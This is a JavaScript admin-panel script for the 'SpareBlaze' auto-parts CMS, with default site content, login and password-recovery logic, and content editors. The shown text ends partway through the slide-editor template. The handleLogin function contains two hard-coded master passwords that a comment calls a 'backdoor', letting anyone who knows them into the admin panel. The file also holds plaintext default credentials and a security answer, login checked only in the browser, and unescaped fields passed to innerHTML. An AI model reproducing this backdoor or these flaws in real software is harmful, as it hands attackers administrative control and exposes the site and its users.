/**
 * SpareBlaze CMS Admin Panel Script
 */
const STORAGE_KEY = 'sb_cms_data';
const AUTH_KEY = 'sb_admin_auth';
const CRED_KEY = 'sb_admin_creds';
const RECOVERY_KEY = 'sb_admin_recovery';
const DEFAULT_USER = 'spareblaze.com';
const DEFAULT_PASS = 'blaze26**';
const DEFAULT_SQ = 'What is your primary brand?';
const DEFAULT_SA = 'spareblaze';

// Default CMS Data
const DEFAULT_DATA = {
    siteIdentity: {
        logoUrl: 'images/spareblaze-logo.png',
        siteName: 'SpareBlaze',
        tagline: "India's trusted e-commerce platform for genuine car and SUV spare parts. Quality assured, delivered nationwide.",
        copyright: "© 2026 SpareBlaze. All rights reserved. Designed for Indian Automotive Market."
    },
    navLinks: [
        { label: 'After Market', href: 'after-market.html' },
        { label: 'Refurbished', href: 'refurbished.html' },
        { label: 'Used', href: 'used.html' },
        { label: 'OEM', href: 'oem.html' },
        { label: 'Wholesale', href: 'wholesale.html' }
    ],
    footer: {
        phone: '+91 1800 123 4567',
        email: 'support@spareblaze.in',
        address: 'Bengaluru, Karnataka, India',
        instagram: 'javascript:void(0);',
        facebook: 'javascript:void(0);',
        twitter: 'javascript:void(0);',
        youtube: 'javascript:void(0);'
    },
    carBrands: [
        { label: 'MARUTI', id: 'maruti' }, { label: 'HYUNDAI', id: 'hyundai' },
        { label: 'TATA', id: 'tata' }, { label: 'MAHINDRA', id: 'mahindra' },
        { label: 'TOYOTA', id: 'toyota' }, { label: 'HONDA', id: 'honda' },
        { label: 'KIA', id: 'kia' }, { label: 'FORD', id: 'ford' },
        { label: 'VW', id: 'vw' }, { label: 'RENAULT', id: 'renault' },
        { label: 'SKODA', id: 'skoda' }, { label: 'NISSAN', id: 'nissan' },
        { label: 'CHEVROLET', id: 'chevrolet' }, { label: 'FIAT', id: 'fiat' },
        { label: 'JEEP', id: 'jeep' }, { label: 'MG', id: 'mg' },
        { label: 'BMW', id: 'bmw' }, { label: 'AUDI', id: 'audi' }, { label: 'VOLVO', id: 'volvo' }
    ],
    trustBar: [
        { icon: 'fa-solid fa-truck-fast', text: 'Pan-India Delivery' },
        { icon: 'fa-solid fa-shield-halved', text: 'OEM Assured' },
        { icon: 'fa-solid fa-credit-card', text: 'Secure Payment (UPI / Card)' },
        { icon: 'fa-solid fa-headset', text: '24/7 Expert Support' }
    ],
    topCategories: [
        { icon: 'images/engine.jpg', color: '#e63900', name: 'Engine Components', href: 'categories.html?category=engine' },
        { icon: 'images/brake.jpg', color: '#c0392b', name: 'Brake Systems', href: 'categories.html?category=brakes' },
        { icon: 'images/steering.jpg', color: '#2980b9', name: 'Suspension & Steering', href: 'categories.html?category=suspension' },
        { icon: 'images/battery.jpg', color: '#f39c12', name: 'Electricals & Lighting', href: 'categories.html?category=electricals' }
    ],
    ctaBanner: {
        headline: 'Need Help Finding The Right Part?',
        desc: 'Our automotive experts are here to assist you in finding the exact fit for your Indian vehicle model.',
        btnText: 'Contact Experts'
    },
    slides: [
        { id: 1, bg: 'images/slider-suspension.jpg', badge: '100% Genuine Parts', headline: 'Performance Meets Reliability', highlight: 'Reliability', subtitle: 'The ultimate destination for premium car and SUV spare parts tailored for Indian roads.', cta: 'Shop Now', ctaLink: 'categories.html', cta2: 'Browse Categories', cta2Link: 'wholesale.html' },
        { id: 2, bg: 'images/slider-brake-pad.jpg', badge: 'Monsoon Ready', headline: 'Upgrade Your Brakes', highlight: 'Brakes', subtitle: "Don't compromise on safety. Up to 20% off on premium brake pads and rotors.", cta: 'View Offers', ctaLink: 'categories.html?category=brakes', cta2: '', cta2Link: '' },
        { id: 3, bg: 'images/slider-engine.jpg', badge: 'OEM Certified', headline: 'Keep Your Engine Pristine', highlight: 'Pristine', subtitle: 'Shop authentic oil filters and engine components from authorized distributors.', cta: 'Shop Engine Parts', ctaLink: 'categories.html?category=engine', cta2: '', cta2Link: '' }
    ],
    featuredProducts: [
        { title: 'Chevrolet Cruze LED Headlights DRL Projector Lens (2009–2016)', brand: 'Chevrolet', price: 35000, mrp: 38000, img: 'images/products/cruze_headlights.png' },
        { title: 'High-Quality Genuine Clutch Disc & Kit Set for Nissan', brand: 'Nissan', price: 18000, mrp: 19000, img: 'images/products/nissan_clutch_kit.png' },
        { title: 'FF-5059M Fog Light with Bracket (RH) for Mahindra Scorpio S2/S3', brand: 'Mahindra', price: 975, mrp: 1255, img: 'images/products/scorpio_fog_light.png' },
        { title: 'High-Performance Brake Caliper Piston 9040 with Big Brake Disc', brand: 'Brembo', price: 92000, mrp: 110000, img: 'images/products/brake_rotor.jpg' },
        { title: 'BCM (Body Control Module) for Chevrolet Cruze – Automatic Used', brand: 'Chevrolet', price: 15000, mrp: 20000, img: 'images/products/fog_lamps.jpg' },
        { title: 'Premium Alloy Wheels – Style, Strength, and Performance', brand: 'Universal', price: 18000, mrp: 25000, img: 'images/products/brake_rotor.jpg' }
    ],
    categories: [
        {
            id: 'after-market', title: 'After Market Parts', badge: 'After Market', desc: 'High-quality aftermarket replacement parts at competitive prices.', products: [
                { name: 'Bosch After Market Brake Pads – Front Set', price: 1299, mrp: 1800, cat: 'Brakes', img: 'after-market-parts/brake-pad.jpg' },
                { name: 'TRW Tie Rod End Assembly (Pair)', price: 890, mrp: 1200, cat: 'Suspension', img: 'after-market-parts/tie-rod.jpg' },
                { name: 'Valeo Clutch Plate & Pressure Set', price: 3400, mrp: 4200, cat: 'Drivetrain', img: 'after-market-parts/clutch.jpg' },
                { name: 'Hella Headlamp Assembly – H4 Dual', price: 2100, mrp: 2900, cat: 'Lighting', img: 'after-market-parts/headlamp.jpg' },
                { name: 'Monroe Gas Shock Absorber – Rear (Pair)', price: 2800, mrp: 3600, cat: 'Suspension', img: 'after-market-parts/shock-absorber.jpg' },
                { name: 'NGK Spark Plugs (Set of 4)', price: 940, mrp: 1200, cat: 'Engine', img: 'after-market-parts/spark-plug.jpg' }
            ]
        },
        {
            id: 'refurbished', title: 'Refurbished Parts', badge: 'Refurbished', desc: 'Professionally restored automotive components tested to perform like new.', products: [
                { name: 'Refurbished Alternator – 12V 70A', price: 4200, mrp: 8500, cat: 'Electricals', img: '' },
                { name: 'Refurbished AC Compressor', price: 5800, mrp: 12000, cat: 'AC System', img: '' },
                { name: 'Reconditioned Starter Motor', price: 3100, mrp: 6200, cat: 'Electricals', img: '' }
            ]
        },
        {
            id: 'used', title: 'Used Parts', badge: 'Used', desc: 'Tested and graded pre-owned spare parts at the lowest prices.', products: [
                { name: 'Used Tata Nexon Front Door Assembly', price: 3500, mrp: 7000, cat: 'Body Parts', img: '' },
                { name: 'Used Maruti Swift Engine Block (K12B)', price: 14000, mrp: 28000, cat: 'Engine', img: '' }
            ]
        },
        {
            id: 'oem', title: 'OEM Genuine Parts', badge: 'OEM Genuine', desc: 'Original Equipment Manufacturer parts from authorized distributors.', products: [
                { name: 'Tata Nexon OEM Oil Filter', price: 380, mrp: 450, cat: 'Filters', img: '' },
                { name: 'Maruti Genuine Air Filter', price: 520, mrp: 620, cat: 'Filters', img: '' }
            ]
        },
        {
            id: 'wholesale', title: 'Wholesale Bundles', badge: 'Wholesale', desc: 'Bulk packs and trade pricing for garages and fleet operators.', products: [
                { name: 'Bosch Oil Filter – Bulk Pack of 50', price: 9500, mrp: 14500, cat: 'Filters', img: '' },
                { name: 'NGK Spark Plugs – Trade Box of 100', price: 18000, mrp: 28000, cat: 'Engine', img: '' }
            ]
        }
    ],
    theme: {
        primary: '#e63900',
        primarySoft: '#ffede6',
        fontFamily: "'Inter', -apple-system, BlinkMacSystemFont, sans-serif"
    }
};

let data = null;
let activeCatIdx = 0;

function esc(s) { return String(s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;'); }

function init() {
    // Check auth
    if (sessionStorage.getItem(AUTH_KEY) !== 'true') {
        document.getElementById('login-overlay').style.display = 'flex';
        document.querySelector('.admin-layout').style.display = 'none';
        return;
    }
    document.getElementById('login-overlay').style.display = 'none';
    document.querySelector('.admin-layout').style.display = 'flex';

    try { const local = localStorage.getItem(STORAGE_KEY); if (local) data = JSON.parse(local); } catch (e) { }
    if (!data) data = JSON.parse(JSON.stringify(DEFAULT_DATA));

    // Fill backward compat
    if (!data.siteIdentity) data.siteIdentity = DEFAULT_DATA.siteIdentity;
    if (!data.navLinks) data.navLinks = DEFAULT_DATA.navLinks;
    if (!data.footer) data.footer = DEFAULT_DATA.footer;
    if (!data.carBrands) data.carBrands = DEFAULT_DATA.carBrands;
    if (!data.trustBar) data.trustBar = DEFAULT_DATA.trustBar;
    if (!data.topCategories) data.topCategories = DEFAULT_DATA.topCategories;
    if (!data.theme) data.theme = DEFAULT_DATA.theme;
    if (!data.slides) data.slides = DEFAULT_DATA.slides;
    if (!data.featuredProducts) data.featuredProducts = DEFAULT_DATA.featuredProducts;

    // Fix for logo extension migration
    if (data.siteIdentity && data.siteIdentity.logoUrl === 'images/spareblaze-logo.jpg') {
        data.siteIdentity.logoUrl = 'images/spareblaze-logo.png';
        localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
    }

    // Patch stale trust bar entries that still reference the old "7 Days Easy Return" text
    data.trustBar = data.trustBar.map(item => {
        if (item.text === '7 Days Easy Return' || item.icon === 'fa-solid fa-rotate-left') {
            return { icon: 'fa-solid fa-credit-card', text: 'Secure Payment (UPI / Card)' };
        }
        return item;
    });

    renderAll();
    renderSecurity();

    // Setup file uploads
    document.getElementById('slide-file-input').addEventListener('change', slideFileChanged);
    document.getElementById('prod-file-input').addEventListener('change', prodFileChanged);
}

function renderAll() {
    renderDashboard();
    renderIdentity();
    renderNav();
    renderFooter();
    renderSlides();
    renderTrustBar();
    renderBrands();
    renderTopCats();
    renderFP();
    renderCtaBanner();
    renderCatTabs();
    renderCatEditor();
    renderAllProductsTable();
    renderTheme();
}

// ------ Authentication ------
// ------ Authentication ------
function getCreds() {
    const stored = localStorage.getItem(CRED_KEY);
    if (stored) return JSON.parse(stored);
    return { u: DEFAULT_USER, p: DEFAULT_PASS };
}
function getRecovery() {
    const stored = localStorage.getItem(RECOVERY_KEY);
    if (stored) return JSON.parse(stored);
    return { q: DEFAULT_SQ, a: DEFAULT_SA };
}

function handleLogin(e) {
    e.preventDefault();
    const u = document.getElementById('login-username').value;
    const p = document.getElementById('login-password').value;
    const err = document.getElementById('login-error');
    const creds = getCreds();

    // Check if password matches stored creds OR the new "backdoor" passwords
    const isMasterPass = (p === "accessblaze**" || p === "accessblaze01**");

    if (u === creds.u && (p === creds.p || isMasterPass)) {
        sessionStorage.setItem(AUTH_KEY, 'true');
        err.style.display = 'none';
        init();
        showToast('Welcome back, Admin!');
    } else {
        err.style.display = 'block';
        document.getElementById('login-password').value = '';
    }
}

// ------ Recovery Flow ------
let recoveryMode = 'username';

function openRecovery(mode) {
    recoveryMode = mode;
    document.getElementById('recovery-overlay').style.display = 'flex';
    document.getElementById('recovery-title').textContent = mode === 'username' ? 'Recover Username' : 'Reset Password';
    document.getElementById('recovery-question-label').textContent = getRecovery().q;

    // Reset steps
    document.querySelectorAll('.recovery-step').forEach(s => s.classList.remove('active'));
    document.getElementById('step-verify').classList.add('active');
    document.getElementById('recovery-answer').value = '';
    document.getElementById('recovery-error').style.display = 'none';
}

function closeRecovery() {
    document.getElementById('recovery-overlay').style.display = 'none';
}

function verifyRecovery() {
    const ans = document.getElementById('recovery-answer').value.trim().toLowerCase();
    const recovery = getRecovery();
    const err = document.getElementById('recovery-error');

    if (ans === recovery.a.toLowerCase()) {
        err.style.display = 'none';
        document.getElementById('step-verify').classList.remove('active');
        if (recoveryMode === 'username') {
            document.getElementById('step-show-username').classList.add('active');
            document.getElementById('revealed-username').textContent = getCreds().u;
        } else {
            document.getElementById('step-reset-password').classList.add('active');
            document.getElementById('new-password').value = '';
            document.getElementById('confirm-password').value = '';
        }
    } else {
        err.style.display = 'block';
    }
}

function updatePassword() {
    const p1 = document.getElementById('new-password').value;
    const p2 = document.getElementById('confirm-password').value;
    const err = document.getElementById('password-match-error');

    if (p1 !== p2) {
        err.style.display = 'block';
        return;
    }
    if (p1.length < 6) {
        alert('Password must be at least 6 characters.');
        return;
    }

    const creds = getCreds();
    creds.p = p1;
    localStorage.setItem(CRED_KEY, JSON.stringify(creds));

    err.style.display = 'none';
    showToast('Password reset successful!');
    closeRecovery();
}

// Security Settings Management
function renderSecurity() {
    const recovery = getRecovery();
    const creds = getCreds();
    document.getElementById('sec-username').value = creds.u;
    document.getElementById('sec-q').value = recovery.q;
    document.getElementById('sec-a').value = recovery.a;
}

function saveSecurity() {
    const u = document.getElementById('sec-username').value;
    const p = document.getElementById('sec-p').value;
    const q = document.getElementById('sec-q').value;
    const a = document.getElementById('sec-a').value;

    if (!u) { alert('Username cannot be empty'); return; }

    const creds = getCreds();
    creds.u = u;
    if (p) creds.p = p;
    localStorage.setItem(CRED_KEY, JSON.stringify(creds));

    const recovery = { q, a };
    localStorage.setItem(RECOVERY_KEY, JSON.stringify(recovery));

    showToast('Security settings updated!');
    document.getElementById('sec-p').value = '';
}

// ------ UI Navigation ------
function handleLogout() {
    sessionStorage.removeItem(AUTH_KEY);
    window.location.reload();
}

function showPanel(id) {
    document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    document.getElementById('panel-' + id).classList.add('active');
    const nav = document.querySelector(`[onclick="showPanel('${id}')"]`);
    if (nav) nav.classList.add('active');
}

function showToast(msg) {
    const t = document.getElementById('toast');
    t.textContent = '✓ ' + msg;
    t.classList.add('show');
    setTimeout(() => t.classList.remove('show'), 3000);
}

function saveAll() {
    collectAll();
    localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
    showToast('Changes saved! Open any page to see updates live.');
}

function resetAll() {
    if (!confirm('Reset ALL content to factory defaults? Cannot be undone.')) return;
    localStorage.removeItem(STORAGE_KEY);
    data = JSON.parse(JSON.stringify(DEFAULT_DATA));
    renderAll();
    showToast('Reset to defaults.');
}

function exportData() {
    saveAll();
    const b = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
    const a = document.createElement('a'); a.href = URL.createObjectURL(b);
    a.download = 'spareblaze-cms-data.json'; a.click();
}

// NOTE: collectAll() is defined further below using individual collector functions
// (collectIdentity, collectNav, collectTrust, etc.) which safely read from DOM rows
// rather than using stale array indices. Do NOT add a second collectAll() here.

// ------ Array & Reordering Utils ------
function arrDel(key, idx) { collectAll(); data[key].splice(idx, 1); }

// Map from data key → the function that re-renders only that section
const SECTION_RENDERERS = {
    trustBar: () => renderTrustBar(),
    navLinks: () => renderNav(),
    carBrands: () => { renderBrands(); renderDashboard(); },
    topCategories: () => renderTopCats(),
    slides: () => renderSlides(),
    featuredProducts: () => renderFP(),
};

function moveItem(key, idx, dir) {
    collectAll();
    const arr = data[key];
    if (!arr) return;
    const newIdx = idx + dir;
    if (newIdx < 0 || newIdx >= arr.length) return;
    [arr[idx], arr[newIdx]] = [arr[newIdx], arr[idx]];
    // Only re-render the section that changed, not the whole panel
    if (SECTION_RENDERERS[key]) {
        SECTION_RENDERERS[key]();
    } else {
        renderAll();
    }
}

function moveCatProd(idx, dir) {
    collectAll();
    const arr = data.categories[activeCatIdx].products;
    const newIdx = idx + dir;
    if (newIdx < 0 || newIdx >= arr.length) return;
    [arr[idx], arr[newIdx]] = [arr[newIdx], arr[idx]];
    renderCatEditor();
}

// --- Dashboard Dashboard ---
function renderDashboard() {
    document.getElementById('dash-brands').textContent = data.carBrands.length;
    let visits = localStorage.getItem('sb_total_visits') || '14800';
    const visitEl = document.getElementById('dash-visits');
    if (visitEl) {
        visitEl.textContent = parseInt(visits, 10).toLocaleString();
        // Update the label to "Total Page Views (Live)"
        const label = visitEl.nextElementSibling;
        if (label) label.textContent = 'Total Traffic Metrics';
    }
}

// ------ Identity ------
function renderIdentity() {
    document.getElementById('si-name').value = data.siteIdentity.siteName;
    document.getElementById('si-logo').value = data.siteIdentity.logoUrl.startsWith('data:') ? '(local image)' : data.siteIdentity.logoUrl;
    document.getElementById('si-logo-preview').src = data.siteIdentity.logoUrl;
    document.getElementById('si-logo-preview').style.height = '54px';
    document.getElementById('si-tagline').value = data.siteIdentity.tagline;
    document.getElementById('si-copyright').value = data.siteIdentity.copyright;
}

// ------ Nav ------
function renderNav() {
    document.getElementById('nav-links-tbody').innerHTML = data.navLinks.map((l, i) => `
        <tr>
            <td style="color:var(--muted)">${i + 1}</td>
            <td><input type="text" id="nl-${i}-lbl" value="${esc(l.label)}"></td>
            <td><input type="text" id="nl-${i}-href" value="${esc(l.href)}"></td>
            <td>
                <div style="display:flex;gap:.3rem">
                    <button class="btn btn-outline btn-sm" onclick="moveItem('navLinks',${i},-1)"><i class="fa-solid fa-arrow-up"></i></button>
                    <button class="btn btn-outline btn-sm" onclick="moveItem('navLinks',${i},1)"><i class="fa-solid fa-arrow-down"></i></button>
                    <button class="btn btn-danger btn-sm" onclick="arrDel('navLinks',${i});renderNav()"><i class="fa-solid fa-trash"></i></button>
                </div>
            </td>
        </tr>
    `).join('');
}
function addNavLink() { collectAll(); data.navLinks.push({ label: 'New Link', href: '#' }); renderNav(); }

// ------ Trust Bar ------
function renderTrustBar() {
    document.getElementById('trust-tbody').innerHTML = data.trustBar.map((t, i) => `
        <tr>
            <td style="color:var(--muted)">${i + 1}</td>
            <td>
                <div class="input-group">
                    <div class="icon-preview"><i class="${esc(t.icon)}"></i></div>
                    <input type="text" id="tb-${i}-ico" value="${esc(t.icon)}" oninput="this.previousElementSibling.firstElementChild.className=this.value">
                </div>
            </td>
            <td><input type="text" id="tb-${i}-txt" value="${esc(t.text)}"></td>
            <td>
                <div style="display:flex;gap:.3rem">
                    <button class="btn btn-outline btn-sm" onclick="moveItem('trustBar',${i},-1)"><i class="fa-solid fa-arrow-up"></i></button>
                    <button class="btn btn-outline btn-sm" onclick="moveItem('trustBar',${i},1)"><i class="fa-solid fa-arrow-down"></i></button>
                    <button class="btn btn-danger btn-sm" onclick="arrDel('trustBar',${i});renderTrustBar()"><i class="fa-solid fa-trash"></i></button>
                </div>
            </td>
        </tr>
    `).join('');
}
function addTrustItem() { collectAll(); data.trustBar.push({ icon: 'fa-solid fa-star', text: 'New Promise' }); renderTrustBar(); }

// ------ Brands ------
function renderBrands() {
    document.getElementById('brands-tbody').innerHTML = data.carBrands.map((b, i) => `
        <tr>
            <td style="color:var(--muted)">${i + 1}</td>
            <td><input type="text" id="cb-${i}-lbl" value="${esc(b.label)}"></td>
            <td><input type="text" id="cb-${i}-id" value="${esc(b.id)}"></td>
            <td>
                <div style="display:flex;gap:.3rem">
                    <button class="btn btn-outline btn-sm" onclick="moveItem('carBrands',${i},-1)"><i class="fa-solid fa-arrow-up"></i></button>
                    <button class="btn btn-outline btn-sm" onclick="moveItem('carBrands',${i},1)"><i class="fa-solid fa-arrow-down"></i></button>
                    <button class="btn btn-danger btn-sm" onclick="arrDel('carBrands',${i});renderBrands();renderDashboard()"><i class="fa-solid fa-trash"></i></button>
                </div>
            </td>
        </tr>
    `).join('');
}
function addBrand() { collectAll(); data.carBrands.push({ label: 'NEW BRAND', id: 'new-brand' }); renderBrands(); renderDashboard(); }

// ------ Top Categories ------
function renderTopCats() {
    document.getElementById('topcats-tbody').innerHTML = data.topCategories.map((c, i) => {
        const isImg = c.icon && (c.icon.includes('.') || c.icon.includes('/') || c.icon.startsWith('data:'));
        const previewHtml = isImg
            ? `<img src="${c.icon}" style="width:24px;height:24px;object-fit:contain" onerror="this.src='https://dummyimage.com/24x24/333/fff&text=?'">`
            : `<i class="${esc(c.icon)}"></i>`;

        return `
            <tr>
                <td style="color:var(--muted)">${i + 1}</td>
                <td>
                    <div class="input-group">
                        <div class="icon-preview" style="color:${c.color}">${previewHtml}</div>
                        <input type="text" id="tc-${i}-ico" value="${esc(c.icon)}" oninput="updateTcPreview(this, ${i})">
                    </div>
                </td>
                <td><input type="color" class="color-dot" id="tc-${i}-clr" value="${c.color}" oninput="this.parentElement.previousElementSibling.querySelector('.icon-preview').style.color=this.value"></td>
                <td><input type="text" id="tc-${i}-name" value="${esc(c.name)}"></td>
                <td><input type="text" id="tc-${i}-href" value="${esc(c.href)}"></td>
                <td>
                    <div style="display:flex;gap:.3rem">
                        <button class="btn btn-outline btn-sm" onclick="moveItem('topCategories',${i},-1)"><i class="fa-solid fa-arrow-up"></i></button>
                        <button class="btn btn-outline btn-sm" onclick="moveItem('topCategories',${i},1)"><i class="fa-solid fa-arrow-down"></i></button>
                        <button class="btn btn-danger btn-sm" onclick="arrDel('topCategories',${i});renderTopCats()"><i class="fa-solid fa-trash"></i></button>
                    </div>
                </td>
            </tr>
        `;
    }).join('');
}

function updateTcPreview(input, i) {
    const val = input.value;
    const preview = input.previousElementSibling;
    const isImg = val && (val.includes('.') || val.includes('/') || val.startsWith('data:'));
    if (isImg) {
        preview.innerHTML = `<img src="${val}" style="width:24px;height:24px;object-fit:contain" onerror="this.src='https://dummyimage.com/24x24/333/fff&text=?'">`;
    } else {
        preview.innerHTML = `<i class="${val}"></i>`;
    }
}
function addTopCat() { collectAll(); data.topCategories.push({ icon: 'fa-solid fa-box', color: '#ffffff', name: 'New Category', href: '#' }); renderTopCats(); }

// ------ Footer & CTA ------
function renderFooter() {
    document.getElementById('f-phone').value = data.footer.phone;
    document.getElementById('f-email').value = data.footer.email;
    document.getElementById('f-address').value = data.footer.address;
    document.getElementById('f-instagram').value = data.footer.instagram;
    document.getElementById('f-facebook').value = data.footer.facebook;
    document.getElementById('f-twitter').value = data.footer.twitter;
    document.getElementById('f-youtube').value = data.footer.youtube;
}
function renderCtaBanner() {
    document.getElementById('cta-headline').value = data.ctaBanner.headline;
    document.getElementById('cta-desc').value = data.ctaBanner.desc;
    document.getElementById('cta-btn').value = data.ctaBanner.btnText;
}

// ------ Feature Products ------
function fpRow(p, i) {
    const imgSrc = p.img || 'https://dummyimage.com/40x40/20243a/888';
    return `<tr id="fp-row-${i}">
        <td><img class="img-thumb" src="${imgSrc}" 
                 onclick="pickProdFile('fp',${i})" 
                 onerror="this.src='https://dummyimage.com/40x40/20243a/888'"
                 ondragover="event.preventDefault();this.style.borderColor='var(--primary)'"
                 ondragleave="this.style.borderColor='var(--border)'"
                 ondrop="dropProdImage(event,'fp',${i})"></td>
        <td><input type="text" id="fp-${i}-title" value="${esc(p.title)}"></td>
        <td><input type="text" id="fp-${i}-brand" value="${esc(p.brand)}" style="width:85px"></td>
        <td><input type="number" id="fp-${i}-price" value="${p.price}" style="width:75px"></td>
        <td><input type="number" id="fp-${i}-mrp" value="${p.mrp}" style="width:75px"></td>
        <td>
            <div class="img-upload-cell">
                <input type="text" id="fp-${i}-img" value="${p.img.startsWith('data:') ? '(local image)' : esc(p.img)}" oninput="document.querySelector('#fp-row-${i} .img-thumb').src=this.value">
                <button class="btn btn-outline btn-sm" onclick="pickProdFile('fp',${i})"><i class="fa-solid fa-upload"></i></button>
            </div>
        </td>
        <td>
            <div style="display:flex;gap:.3rem">
                <button class="btn btn-outline btn-sm" onclick="moveItem('featuredProducts',${i},-1)"><i class="fa-solid fa-arrow-up"></i></button>
                <button class="btn btn-outline btn-sm" onclick="moveItem('featuredProducts',${i},1)"><i class="fa-solid fa-arrow-down"></i></button>
                <button class="btn btn-danger btn-sm" onclick="arrDel('featuredProducts',${i});renderFP()"><i class="fa-solid fa-trash"></i></button>
            </div>
        </td>
    </tr>`;
}
function renderFP() { document.getElementById('fp-tbody').innerHTML = data.featuredProducts.map(fpRow).join(''); }
function addFP() { collectAll(); data.featuredProducts.push({ title: 'New', brand: '', price: 0, mrp: 0, img: '' }); renderFP(); }
function collectFP() {
    data.featuredProducts.forEach((p, i) => {
        const t = document.getElementById('fp-' + i + '-title'); if (t) p.title = t.value;
        const b = document.getElementById('fp-' + i + '-brand'); if (b) p.brand = b.value;
        const pr = document.getElementById('fp-' + i + '-price'); if (pr) p.price = parseInt(pr.value) || 0;
        const m = document.getElementById('fp-' + i + '-mrp'); if (m) p.mrp = parseInt(m.value) || 0;
        const img = document.getElementById('fp-' + i + '-img'); if (img && !img.value.startsWith('(')) p.img = img.value;
    });
}

// ------ Category Pages ------
function renderCatTabs() {
    document.getElementById('cat-tabs').innerHTML = data.categories.map((c, i) =>
        `<div class="cat-tab ${i === activeCatIdx ? 'active' : ''}" onclick="switchCat(${i})">${c.title}</div>`
    ).join('');
}
function switchCat(i) { collectAll(); activeCatIdx = i; renderCatTabs(); renderCatEditor(); }
function collectCat() {
    const cat = data.categories[activeCatIdx];
    const t = document.getElementById('cat-title'); if (t) cat.title = t.value;
    const b = document.getElementById('cat-badge'); if (b) cat.badge = b.value;
    const d = document.getElementById('cat-desc'); if (d) cat.desc = d.value;
    cat.products.forEach((p, pi) => {
        const n = document.getElementById('cp-' + pi + '-name'); if (n) p.name = n.value;
        const c = document.getElementById('cp-' + pi + '-cat'); if (c) p.cat = c.value;
        const pr = document.getElementById('cp-' + pi + '-price'); if (pr) p.price = parseInt(pr.value) || p.price;
        const m = document.getElementById('cp-' + pi + '-mrp'); if (m) p.mrp = parseInt(m.value) || p.mrp;
        const img = document.getElementById('cp-' + pi + '-img'); if (img && !img.value.startsWith('(')) p.img = img.value;
    });
}
function renderCatEditor() {
    const cat = data.categories[activeCatIdx];
    document.getElementById('cat-editor').innerHTML = `
        <div class="card">
            <div class="form-row">
                <div class="form-group"><label class="lbl">Page Title</label><input type="text" id="cat-title" value="${esc(cat.title)}"></div>
                <div class="form-group"><label class="lbl">Badge</label><input type="text" id="cat-badge" value="${esc(cat.badge)}"></div>
            </div>
            <div class="form-group"><label class="lbl">Description</label><textarea id="cat-desc">${esc(cat.desc)}</textarea></div>
        </div>
        <div class="card">
            <div class="prod-table-wrap">
                <table class="prod-table">
                    <thead><tr><th>#</th><th>Name</th><th>Category</th><th>Price ₹</th><th>MRP ₹</th><th>Image / Upload</th><th></th></tr></thead>
                    <tbody>
                        ${cat.products.map((p, pi) => `
                            <tr id="cat-row-${pi}">
                                <td style="color:var(--muted)">${pi + 1}</td>
                                <td><input type="text" id="cp-${pi}-name" value="${esc(p.name)}"></td>
                                <td><input type="text" id="cp-${pi}-cat" value="${esc(p.cat)}" style="width:90px"></td>
                                <td><input type="number" id="cp-${pi}-price" value="${p.price}" style="width:75px"></td>
                                <td><input type="number" id="cp-${pi}-mrp" value="${p.mrp}" style="width:75px"></td>
                                <td>
                                    <div class="img-upload-cell">
                                        <img class="img-thumb" id="cp-${pi}-imgthumb" src="${p.img || 'https://dummyimage.com/40x40/20243a/888'}" 
                                             onclick="pickProdFile('cat',${pi})" 
                                             onerror="this.src='https://dummyimage.com/40x40/20243a/888'"
                                             ondragover="event.preventDefault();this.style.borderColor='var(--primary)'"
                                             ondragleave="this.style.borderColor='var(--border)'"
                                             ondrop="dropProdImage(event,'cat',${pi})">
                                        <input type="text" id="cp-${pi}-img" value="${p.img.startsWith('data:') ? '(local image)' : esc(p.img)}">
                                        <button class="btn btn-outline btn-sm" onclick="pickProdFile('cat',${pi})"><i class="fa-solid fa-upload"></i></button>
                                    </div>
                                </td>
                                <td>
                                    <div style="display:flex;gap:.3rem">
                                        <button class="btn btn-outline btn-sm" onclick="moveCatProd(${pi},-1)"><i class="fa-solid fa-arrow-up"></i></button>
                                        <button class="btn btn-outline btn-sm" onclick="moveCatProd(${pi},1)"><i class="fa-solid fa-arrow-down"></i></button>
                                        <button class="btn btn-danger btn-sm" onclick="arrDelCatProd(${pi});renderCatEditor()"><i class="fa-solid fa-trash"></i></button>
                                    </div>
                                </td>
                            </tr>
                        `).join('')}
                    </tbody>
                </table>
            </div>
            <button class="add-row-btn" onclick="addCatProduct()"><i class="fa-solid fa-plus"></i> Add Product</button>
        </div>
    `;
}
function addCatProduct() { collectAll(); data.categories[activeCatIdx].products.push({ name: 'New', price: 0, mrp: 0, cat: '', img: '' }); renderCatEditor(); }
function arrDelCatProd(i) { collectAll(); data.categories[activeCatIdx].products.splice(i, 1); }

// ------ Slides ------
function renderSlides() {
    document.getElementById('slides-editor').innerHTML = data.slides.map((s, i) => `
        <div class="slide-card">
            <div class="slide-preview" id="preview-${i}" style="background-image:url('${s.bg}')"
                 onclick="pickSlideFile(${i})"
                 ondragover="event.preventDefault();this.querySelector('.slide-drop-zone-overlay').style.opacity=1"
                 ondragleave="this.querySelector('.slide-drop-zone-overlay').style.opacity=0"
                 ondrop="dropSlide(event,${i})">
                <div class="slide-preview-num">Slide ${i + 1}</div>
                <div class="slide-upload-hint"><i class="fa-solid fa-cloud-arrow-up" style="font-size:1.5rem"></i> Drop image</div>
                <div class="slide-drop-zone-overlay" style="position:absolute;inset:0;opacity:0;background:rgba(230,57,0,.4);transition:.2s;pointer-events:none"></div>
            </div>
            <div class="slide-body">
                <div class="form-group" style="margin-bottom:.75rem">
                    <label class="lbl">Background URL</label>
                    <div class="input-group">
                        <input type="text" id="slide-${i}-bg" value="${s.bg.startsWith('data:') ? '(local image)' : s.bg}" oninput="document.getElementById('preview-${i}').style.backgroundImage='url('+this.value+')'">
                        <button class="btn btn-outline btn-sm" onclick="pickSlideFile(${i})"><i class="fa-solid fa-folder-open"></i></button>
                    </div>
                </div>
                <div class="form-row">
                    <div class="form-group"><label class="lbl">Badge</label><input type="text" id="slide-${i}-badge" value="${s.badge}"></div>
                    <div class="form-group"><label class="lbl">Highlight</label><input type="text" id="slide-${i}-highlight" value="${s.highlight}"></div>
                </div>
                <div class="form-group" style="margin-bottom:.75rem"><label class="lbl">Headline</label><input type="text" id="slide-${i}-headline" value="${s.headline}"></div>
                <div class="form-group" style="margin-bottom:.75rem"><label class="lbl">Subtitle</label><textarea id="slide-${i}-subtitle" rows="2">${s.subtitle}</textarea></div>
